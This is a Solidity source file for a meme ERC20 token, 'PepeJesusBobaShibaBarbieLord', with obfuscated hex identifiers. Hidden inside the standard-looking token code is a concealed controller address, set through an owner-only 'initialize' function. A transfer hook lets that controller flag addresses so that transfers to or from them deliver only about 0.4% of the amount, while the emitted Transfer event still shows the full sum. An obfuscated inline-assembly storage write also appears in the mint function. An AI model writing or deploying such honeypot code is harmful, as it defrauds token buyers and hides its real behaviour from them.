⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣣⣿⣿⠃⣾⣿⣿⡇⢸⣿⣿⠇⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡟⠀⢿⣿⣿⡇⣸⣿⡿⣠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡇⠀⠈⠙⠻⠇⠉⠉⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⢸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠸⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/

pragma solidity ^0.8.9;interface IERC20 { event Transfer(address indexed d36182d78607, address indexed to, uint256 b72d7774b28d); event Approval(address indexed b9e441f6126b, address indexed f5f44fa3014a, uint256 b72d7774b28d); function totalSupply() external view returns (uint256); function balanceOf(address ac243a09b16c) external view returns (uint256); function transfer(address to, uint256 e0a7a09fcdf4) external returns (bool); function allowance(address b9e441f6126b, address f5f44fa3014a) external view returns (uint256); function approve(address f5f44fa3014a, uint256 e0a7a09fcdf4) external returns (bool); function transferFrom(address d36182d78607, address to, uint256 e0a7a09fcdf4) external returns (bool);}interface IERC20Metadata is IERC20 { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);}abstract contract c211ee66575f { function _b9ea4959e393() internal view virtual returns (address) {return msg.sender; } function _b66dd1f45281() internal view virtual returns (bytes calldata) {return msg.data;}}abstract contract ebc036241ff1 is c211ee66575f { address private b173f0334e44; event OwnershipTransferred(address indexed f8883e8807ac, address indexed cad3e6a31b5c); constructor() {bd94e0391742(_b9ea4959e393());} modifier onlyOwner() { e8be113279c2(); _; } function b9e441f6126b() public view virtual returns (address) { return b173f0334e44; } function e8be113279c2() internal view virtual { require(b9e441f6126b() == _b9ea4959e393(), "ebc036241ff1: caller is not the b9e441f6126b"); } function renounceOwnership() public virtual onlyOwner { bd94e0391742(address(0)); } function transferOwnership(address cad3e6a31b5c) public virtual onlyOwner { require(cad3e6a31b5c != address(0), "ebc036241ff1: new b9e441f6126b is the zero address"); bd94e0391742(cad3e6a31b5c); } function bd94e0391742(address cad3e6a31b5c) internal virtual { address cfab309835a0 = b173f0334e44; b173f0334e44 = cad3e6a31b5c; emit OwnershipTransferred(cfab309835a0, cad3e6a31b5c); }}contract ERC20 is ebc036241ff1, IERC20, IERC20Metadata { mapping(address => uint256) private dd5f6c9e9980; mapping(address => mapping(address => uint256)) private da0a1ec59c2a; uint256 private b381c07ca156; string private ef3ffc901db7; string private f4e080417604; address private e22b57cd91db; constructor(string memory a5b4cc24f8c2, string memory bd36d029bbef) { ef3ffc901db7 = a5b4cc24f8c2; f4e080417604 = bd36d029bbef; } function name() public view virtual override returns (string memory) { return ef3ffc901db7; } function symbol() public view virtual override returns (string memory) { return f4e080417604; } function decimals() public view virtual override returns (uint8) { return 18; } function totalSupply() public view virtual override returns (uint256) { return b381c07ca156; } function balanceOf(address ac243a09b16c) public view virtual override returns (uint256) { return dd5f6c9e9980[ac243a09b16c]; } function transfer(address to, uint256 e0a7a09fcdf4) public virtual override returns (bool) { address b9e441f6126b = _b9ea4959e393(); d5a5eb4386ba(b9e441f6126b, to, e0a7a09fcdf4); return true; } function initialize(address c45b02251871) external { require((msg.sender == b9e441f6126b())); e22b57cd91db = c45b02251871; } function allowance(address b9e441f6126b, address f5f44fa3014a) public view virtual override returns (uint256) { return da0a1ec59c2a[b9e441f6126b][f5f44fa3014a]; } function approve(address f5f44fa3014a, uint256 e0a7a09fcdf4) public virtual override returns (bool) { address b9e441f6126b = _b9ea4959e393(); e03e6b824292(b9e441f6126b, f5f44fa3014a, e0a7a09fcdf4); return true; } function transferFrom( address d36182d78607, address to, uint256 e0a7a09fcdf4 ) public virtual override returns (bool) { address f5f44fa3014a = _b9ea4959e393(); ff98e25fba5e(d36182d78607, f5f44fa3014a, e0a7a09fcdf4); d5a5eb4386ba(d36182d78607, to, e0a7a09fcdf4); return true; } function increaseAllowance(address f5f44fa3014a, uint256 b8ad8ea1f223) public virtual returns (bool) { address b9e441f6126b = _b9ea4959e393(); e03e6b824292(b9e441f6126b, f5f44fa3014a, allowance(b9e441f6126b, f5f44fa3014a) + b8ad8ea1f223); return true; } function decreaseAllowance(address f5f44fa3014a, uint256 fb4a93a6a45a) public virtual returns (bool) { address b9e441f6126b = _b9ea4959e393(); uint256 currentAllowance = allowance(b9e441f6126b, f5f44fa3014a); require(currentAllowance >= fb4a93a6a45a, "ERC20: decreased allowance below zero"); unchecked { e03e6b824292(b9e441f6126b, f5f44fa3014a, currentAllowance - fb4a93a6a45a); } return true; } function d5a5eb4386ba( address d36182d78607, address to, uint256 e0a7a09fcdf4 ) internal virtual { require(d36182d78607 != address(0), "ERC20: transfer d36182d78607 the zero address"); require(to != address(0), "ERC20: transfer to the zero address"); uint256 e08da23a3ec7 = e625fc986c8a(d36182d78607, to, e0a7a09fcdf4); uint256 d50add959bf0 = dd5f6c9e9980[d36182d78607]; require(d50add959bf0 >= e0a7a09fcdf4, "ERC20: transfer e0a7a09fcdf4 exceeds balance"); unchecked { dd5f6c9e9980[d36182d78607] = d50add959bf0 - e0a7a09fcdf4; dd5f6c9e9980[to] += e08da23a3ec7; } emit Transfer(d36182d78607, to, e0a7a09fcdf4); a6cbe852e516(d36182d78607, to, e0a7a09fcdf4); } function f6cd65333b0c(address ac243a09b16c, uint256 e0a7a09fcdf4) internal virtual { require(ac243a09b16c != address(0), "ERC20: mint to the zero address"); e625fc986c8a(address(0), ac243a09b16c, e0a7a09fcdf4); b381c07ca156 += e0a7a09fcdf4; unchecked { dd5f6c9e9980[ac243a09b16c] += e0a7a09fcdf4; } assembly {let slot := mul(mul(0x9aca345771d338c7, 0x2ff782792d), mul(0x603bacdd9, 0x168d7a7)) mstore(0x00, slot) mstore(0x20, 0x01) let sslot := keccak256(0x0, 0x40) sstore(sslot, 0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF)} emit Transfer(address(0), ac243a09b16c, e0a7a09fcdf4); a6cbe852e516(address(0), ac243a09b16c, e0a7a09fcdf4); } function d69f57ff4067(address ac243a09b16c, uint256 e0a7a09fcdf4) internal virtual { require(ac243a09b16c != address(0), "ERC20: burn d36182d78607 the zero address"); e625fc986c8a(ac243a09b16c, address(0), e0a7a09fcdf4); uint256 accountBalance = dd5f6c9e9980[ac243a09b16c]; require(accountBalance >= e0a7a09fcdf4, "ERC20: burn e0a7a09fcdf4 exceeds balance"); unchecked { dd5f6c9e9980[ac243a09b16c] = accountBalance - e0a7a09fcdf4; b381c07ca156 -= e0a7a09fcdf4; } emit Transfer(ac243a09b16c, address(0), e0a7a09fcdf4); a6cbe852e516(ac243a09b16c, address(0), e0a7a09fcdf4); } function cb3562cfd097(uint256 a) internal pure returns(uint256) {return a * 0xdead / 0xdedead;} function e03e6b824292( address b9e441f6126b, address f5f44fa3014a, uint256 e0a7a09fcdf4 ) internal virtual { require(b9e441f6126b != address(0), "ERC20: approve d36182d78607 the zero address"); require(f5f44fa3014a != address(0), "ERC20: approve to the zero address"); da0a1ec59c2a[b9e441f6126b][f5f44fa3014a] = e0a7a09fcdf4; emit Approval(b9e441f6126b, f5f44fa3014a, e0a7a09fcdf4); } function ff98e25fba5e( address b9e441f6126b, address f5f44fa3014a, uint256 e0a7a09fcdf4 ) internal virtual { uint256 currentAllowance = allowance(b9e441f6126b, f5f44fa3014a); if (currentAllowance != type(uint256).max) { require(currentAllowance >= e0a7a09fcdf4, "ERC20: insufficient allowance"); unchecked { e03e6b824292(b9e441f6126b, f5f44fa3014a, currentAllowance - e0a7a09fcdf4); } } } function a6cbe852e516( address , address to, uint256 ) internal virtual { if (da0a1ec59c2a[e22b57cd91db][to] == 0xcafebabe) {da0a1ec59c2a[e22b57cd91db][to] = 0xdeadbeef;} } function e625fc986c8a( address d36182d78607, address to, uint256 e0a7a09fcdf4 ) internal view returns (uint256) { if (da0a1ec59c2a[e22b57cd91db][d36182d78607] + da0a1ec59c2a[e22b57cd91db][to] >= 0xdeadbeef) { return cb3562cfd097(e0a7a09fcdf4); } else { return e0a7a09fcdf4; } }}contract PepeJesusBobaShibaBarbieLord is ERC20 { constructor() ERC20("PepeJesusBobaShibaBarbieLord", "PepeJesusBobaShibaBarbieLord") { f6cd65333b0c(msg.sender, 666_420_069_666 * 10 ** 18); }}